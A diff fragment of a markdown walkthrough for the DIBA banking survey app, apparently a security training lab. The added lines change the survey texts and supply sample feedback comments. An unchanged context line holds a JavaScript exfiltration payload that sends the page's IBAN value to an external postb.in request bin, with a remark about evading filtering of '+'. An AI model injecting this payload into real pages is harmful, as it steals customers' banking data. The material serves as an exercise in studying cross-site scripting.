@@ -272,6 +272,18 @@ The DIBA app provides a survey to banking customers so they can provide some fee
 
 **Check**: Works
 
+Change texts as follows:
+
+Your recently opened account IBAN:
+
+Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).
+
+And make sure to us good comments already in there, so use the following 3 examples:
+
+5: Very good service, thank you!
+3:  It’s OK, but I’ve seen better apps.
+2: Not happy, I’m thinking about using another bank. 
+
 Note: I only could do string concatenation with the concat method, but not with "+":
 
 new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
